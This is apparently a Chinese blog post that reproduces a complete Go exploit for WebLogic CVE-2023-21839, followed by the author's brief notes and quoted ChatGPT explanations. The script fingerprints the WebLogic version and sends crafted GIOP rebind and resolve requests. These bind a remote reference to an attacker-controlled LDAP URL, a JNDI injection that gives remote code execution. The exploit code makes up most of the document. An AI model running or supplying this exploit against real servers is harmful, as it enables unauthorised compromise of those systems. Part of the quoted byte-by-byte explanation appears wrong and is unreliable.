<h4 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;CVE-2023-21839&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/binary&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	hostConfig <span class="type">string</span></span><br><span class="line">	portConfig <span class="type">int</span></span><br><span class="line">	ldapConfig <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	key1    <span class="type">string</span></span><br><span class="line">	key2    <span class="type">string</span></span><br><span class="line">	key3    <span class="type">string</span></span><br><span class="line">	wlsKey1 <span class="type">string</span></span><br><span class="line">	wlsKey2 <span class="type">string</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	ServiceContext0 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;05&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;000000000000010000000d3137322e32362e3131322e310000ec5b&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	ServiceContext1 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;01&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;0000000001002005010001&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	ServiceContext2 = &amp;giop.ServiceContext&#123;</span><br><span class="line">		VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">		SCID:       giop.D(<span class="string">&quot;00&quot;</span>),</span><br><span class="line">		Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">		Data:       giop.D(<span class="string">&quot;0a0301&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.StringVar(&amp;hostConfig, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;ip&quot;</span>)</span><br><span class="line">	flag.IntVar(&amp;portConfig, <span class="string">&quot;port&quot;</span>, <span class="number">7001</span>, <span class="string">&quot;port&quot;</span>)</span><br><span class="line">	flag.StringVar(&amp;ldapConfig, <span class="string">&quot;ldap&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;ldap&quot;</span>)</span><br><span class="line">	flag.Parse()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> hostConfig == <span class="string">&quot;&quot;</span> || ldapConfig == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Weblogic CVE-2023-21839&quot;</span>)</span><br><span class="line">		flag.Usage()</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(ldapConfig, <span class="string">&quot;ldap&quot;</span>) &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Weblogic CVE-2023-21839&quot;</span>)</span><br><span class="line">		flag.Usage()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-ip: %s\n&quot;</span>, hostConfig)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-port: %d\n&quot;</span>, portConfig)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;[*] your-ldap: %s\n&quot;</span>, ldapConfig)</span><br><span class="line"></span><br><span class="line">	vp := <span class="string">&quot;743320392e322e302e300a41533a3235350a484c3a39320a4d5&quot;</span> +</span><br><span class="line">		<span class="string">&quot;33a31303030303030300a50553a74333a2f2f746573743a373030310a0a&quot;</span></span><br><span class="line">	ver := giop.GetVersion(hostConfig, vp, portConfig)</span><br><span class="line">	<span class="keyword">if</span> ver == <span class="string">&quot;12&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 12&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ver == <span class="string">&quot;14&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 14&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646&quot;</span> +</span><br><span class="line">			<span class="string">&quot;d696e53657276657200000000000000003349444c3a7765626c&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6769632f636f7262612f636f732f6e616d696e672f4e616d6&quot;</span> +</span><br><span class="line">			<span class="string">&quot;96e67436f6e74657874416e793a312e30000000000002380000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;200000000000000003349444c3a7765626c6f6769632f636f72&quot;</span> +</span><br><span class="line">			<span class="string">&quot;62612f636f732f6e616d696e672f4e616d696e67436f6e74657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541&quot;</span> +</span><br><span class="line">			<span class="string">&quot;2e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[!] error and exit&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	host := hostConfig</span><br><span class="line">	port := portConfig</span><br><span class="line">	conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, host, port))</span><br><span class="line">	rmi := ldapConfig</span><br><span class="line">	<span class="comment">// [ldap len] [ldap string]</span></span><br><span class="line">	ldap := hex.EncodeToString([]<span class="type">byte</span>&#123;<span class="type">byte</span>(<span class="built_in">len</span>(rmi))&#125;)</span><br><span class="line">	ldap += hex.EncodeToString([]<span class="type">byte</span>(rmi))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	locateRequest := &amp;giop.LocateRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.LocateRequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:     giop.Int32(<span class="number">2</span>),</span><br><span class="line">		TargetAddress: giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:    giop.D(giop.NameService),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">2</span>, <span class="string">&quot;LocateRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(locateRequest.Bytes())</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	temp1 := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line">	temp2 := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// GIOP Header</span></span><br><span class="line">	<span class="comment">// IOR Prefix</span></span><br><span class="line">	iOff := <span class="number">0x60</span></span><br><span class="line">	<span class="keyword">for</span> buf[iOff] != <span class="number">0x00</span> &#123;</span><br><span class="line">		<span class="comment">// ProfileHost</span></span><br><span class="line">		iOff++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> iOff &gt; <span class="number">1024</span>*<span class="number">10</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> buf[iOff] == <span class="number">0x00</span> &#123;</span><br><span class="line">		iOff++</span><br><span class="line">	&#125;</span><br><span class="line">	p := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">2</span>)</span><br><span class="line">	p[<span class="number">0</span>] = buf[iOff]</span><br><span class="line">	iOff++</span><br><span class="line">	p[<span class="number">1</span>] = buf[iOff]</span><br><span class="line"></span><br><span class="line">	tempPort := <span class="type">int</span>(binary.BigEndian.Uint16(p))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> tempPort != port &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	lt := iOff - <span class="number">0x60</span></span><br><span class="line">	fOff := <span class="number">0x60</span> + lt + <span class="number">0x75</span></span><br><span class="line">	<span class="comment">// other cases</span></span><br><span class="line">	<span class="keyword">for</span> buf[fOff] == <span class="number">0x00</span> &#123;</span><br><span class="line">		fOff++</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Fake ObjectKey1</span></span><br><span class="line">	<span class="built_in">copy</span>(temp1[<span class="number">0</span>:<span class="number">8</span>], buf[fOff:fOff+<span class="number">8</span>])</span><br><span class="line">	<span class="built_in">copy</span>(temp2[<span class="number">4</span>:<span class="number">8</span>], buf[fOff+<span class="number">4</span>:fOff+<span class="number">8</span>])</span><br><span class="line">	<span class="comment">// Fake ObjectKey2</span></span><br><span class="line">	<span class="built_in">copy</span>(temp2[<span class="number">0</span>:<span class="number">4</span>], []<span class="type">byte</span>&#123;<span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>&#125;)</span><br><span class="line">	key1 = giop.E(temp1)</span><br><span class="line">	key2 = giop.E(temp2)</span><br><span class="line"></span><br><span class="line">	wlsKey1 = strings.ReplaceAll(wlsKey1, <span class="string">&quot;&#123;&#123;key1&#125;&#125;&quot;</span>, key1)</span><br><span class="line"></span><br><span class="line">	rebindAny := &amp;giop.RebindRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">3</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey1),</span><br><span class="line">		RequestOperation: giop.D(giop.RebindAnyOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">6</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;06&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data: giop.D(<span class="string">&quot;0000000000002849444c3a6f6d672e6f72672f53656e64696e67436&quot;</span> +</span><br><span class="line">						<span class="string">&quot;f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;d3137322e32362e3131322e310000ec5b000000640042454108010300000000010000000000000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;0000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f646542617&quot;</span> +</span><br><span class="line">						<span class="string">&quot;3653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdeb&quot;</span> +</span><br><span class="line">						<span class="string">&quot;c0d227000000001000000010000002c00000000000100200000000300010020000100010501000&quot;</span> +</span><br><span class="line">						<span class="string">&quot;10001010000000003000101000001010905010001&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;000000&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;0f&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000000000000000000100000000000000000100000000000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		StubData: giop.D(<span class="string">&quot;0000000000000001000000047465737400000001000000000000001d0000001c00000000000000010&quot;</span> +</span><br><span class="line">			<span class="string">&quot;0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384&quot;</span> +</span><br><span class="line">			<span class="string">&quot;13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242&quot;</span> +</span><br><span class="line">			<span class="string">&quot;412f57537472696e6756616c75653a312e300000000000&quot;</span> + ldap),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">3</span>, <span class="string">&quot;RebindRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(rebindAny.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	startOff := <span class="number">0x64</span> + lt + <span class="number">0xc0</span> + <span class="built_in">len</span>(host) + <span class="comment">// SendingContextRuntime</span></span><br><span class="line">		<span class="number">0xac</span> + lt + <span class="comment">// IOR ProfileHost ProfilePort</span></span><br><span class="line">		<span class="number">0x5d</span> <span class="comment">// ObjectKey Prefix</span></span><br><span class="line">	<span class="keyword">for</span> buf[startOff] != <span class="number">0x32</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> startOff &gt; <span class="number">0x2710</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// InternalKey Offset</span></span><br><span class="line">		startOff++</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> startOff &gt; <span class="number">0x2710</span> &#123;</span><br><span class="line">		key3 = giop.E([]<span class="type">byte</span>&#123;<span class="number">0x32</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x00</span>&#125;)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		key3 = giop.E(buf[startOff : startOff+<span class="number">4</span>])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	wlsKey2 = strings.ReplaceAll(wlsKey2, <span class="string">&quot;&#123;&#123;key3&#125;&#125;&quot;</span>, key3)</span><br><span class="line">	wlsKey2 = strings.ReplaceAll(wlsKey2, <span class="string">&quot;&#123;&#123;key1&#125;&#125;&quot;</span>, key1)</span><br><span class="line"></span><br><span class="line">	rebindAnyTwice := &amp;giop.RebindRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">4</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey2),</span><br><span class="line">		RequestOperation: giop.D(giop.RebindAnyOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		StubData: giop.D(<span class="string">&quot;00000001000000047465737400000001000000000000001d0000001c00000000000000010&quot;</span> +</span><br><span class="line">			<span class="string">&quot;0000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e69&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6e7465726e616c2e466f726569676e4f70617175655265666572656e63653a4432333744393143423246304636384&quot;</span> +</span><br><span class="line">			<span class="string">&quot;13a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242&quot;</span> +</span><br><span class="line">			<span class="string">&quot;412f57537472696e6756616c75653a312e300000000000&quot;</span> + ldap),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">4</span>, <span class="string">&quot;RebindRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(rebindAnyTwice.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	locateRequest2 := &amp;giop.LocateRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.LocateRequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:     giop.Int32(<span class="number">5</span>),</span><br><span class="line">		TargetAddress: giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:    giop.D(giop.NameService),</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	giop.Log(<span class="number">5</span>, <span class="string">&quot;LocateRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(locateRequest2.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	resolve := &amp;giop.ResolveRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">6</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey1),</span><br><span class="line">		RequestOperation: giop.D(giop.ResolveOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		CosNamingDissector: giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	giop.Log(<span class="number">6</span>, <span class="string">&quot;ResolveRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(resolve.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	resolveTwice := &amp;giop.ResolveRequest&#123;</span><br><span class="line">		Header: &amp;giop.Header&#123;</span><br><span class="line">			Magic:        giop.D(giop.GIOP),</span><br><span class="line">			MajorVersion: []<span class="type">byte</span>&#123;giop.MajorVersion&#125;,</span><br><span class="line">			MinorVersion: []<span class="type">byte</span>&#123;giop.MinorVersion&#125;,</span><br><span class="line">			MessageFlags: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">			MessageType:  []<span class="type">byte</span>&#123;giop.RequestType&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		RequestId:        giop.Int32(<span class="number">7</span>),</span><br><span class="line">		ResponseFlags:    []<span class="type">byte</span>&#123;giop.WithTargetScope&#125;,</span><br><span class="line">		TargetAddress:    giop.D(giop.KeyAddr),</span><br><span class="line">		KeyAddress:       giop.D(wlsKey2),</span><br><span class="line">		RequestOperation: giop.D(giop.ResolveOp),</span><br><span class="line">		ServiceContextList: &amp;giop.ServiceContextList&#123;</span><br><span class="line">			SequenceLength: giop.Int32(<span class="number">4</span>),</span><br><span class="line">			ServiceContext: []*giop.ServiceContext&#123;</span><br><span class="line">				ServiceContext0,</span><br><span class="line">				ServiceContext1,</span><br><span class="line">				&#123;</span><br><span class="line">					VSCID:      giop.D(<span class="string">&quot;424541&quot;</span>),</span><br><span class="line">					SCID:       giop.D(<span class="string">&quot;03&quot;</span>),</span><br><span class="line">					Endianness: []<span class="type">byte</span>&#123;giop.BigEndianType&#125;,</span><br><span class="line">					Data:       giop.D(<span class="string">&quot;00000000000000&quot;</span> + key2 + <span class="string">&quot;00000000&quot;</span>),</span><br><span class="line">				&#125;,</span><br><span class="line">				ServiceContext2,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		CosNamingDissector: giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	giop.Log(<span class="number">7</span>, <span class="string">&quot;ResolveRequest&quot;</span>)</span><br><span class="line">	_, _ = conn.Write(resolveTwice.Bytes())</span><br><span class="line">	buf = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">10</span>)</span><br><span class="line">	_, _ = conn.Read(buf)</span><br><span class="line"></span><br><span class="line">	err = conn.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始看到这个脚本让我非常困惑，其中最多的就是奇奇怪怪的数字，后面问了问chatgpt才知道</p>
<p>如</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">CosNamingDissector:</span> giop.D(<span class="string">&quot;00000000000000010000000574657374000000000000000100&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>它表示一个GIOP（General Inter-ORB Protocol）消息的二进制编码。GIOP是CORBA（Common Object Request Broker Architecture）规范中定义的一种通信协议，用于在分布式对象系统中进行通信。</p>
<p>具体来说，这个字节数组表示一个GIOP消息的头部，包括以下信息：</p>
<ul>
<li>00000000 00000001：GIOP版本号，这里表示版本1.0</li>
<li>00000000 00000101：GIOP消息标志，这里表示请求消息</li>
<li>74657374：GIOP消息类型，这里表示一个字符串消息</li>
<li>00000000 00000001：请求消息的标识符，这里为1</li>
</ul>
</blockquote>
<p>该go脚本流程大致为</p>
<blockquote>
<ol>
<li>解析命令行参数（IP地址、端口、LDAP字符串）</li>
<li>获取Weblogic版本号</li>
<li>根据Weblogic版本号设置密钥</li>
<li>连接到Weblogic服务器</li>
<li>设置ServiceContext</li>
<li>构造恶意数据包</li>
<li>发送恶意数据包</li>
<li>关闭连接</li>
</ol>
</blockquote>
<blockquote>
<p>代码中的 import 语句引用了四个不同的包：</p>
<p><code>CVE-2023-21839</code><br><code>encoding/binary</code><br><code>encoding/hex</code><br><code>flag</code><br><code>fmt</code><br><code>net</code><br><code>strings</code><br>其中， flag 用于解析命令行参数。 net 用于处理网络连接。 strings 用于字符串处理。encoding&#x2F;hex 用于十六进制编码&#x2F;解码，encoding&#x2F;binary 用于处理二进制数据。</p>
</blockquote>
<blockquote>
<p>main() 函数开始时解析命令行参数并打印相应的提示信息。然后调用 <code>giop.GetVersion()</code> 函数检测 WebLogic 服务器的版本。分析完版本后然后根据 <code>WebLogic</code> 版本选择不同的攻击方式，分别设置变量 <code>wlsKey1</code> 和 <code>wlsKey2</code>，最后使用 <code>net.Dial()</code> 函数建立与 <code>WebLogic</code> 服务器的连接。</p>
</blockquote>
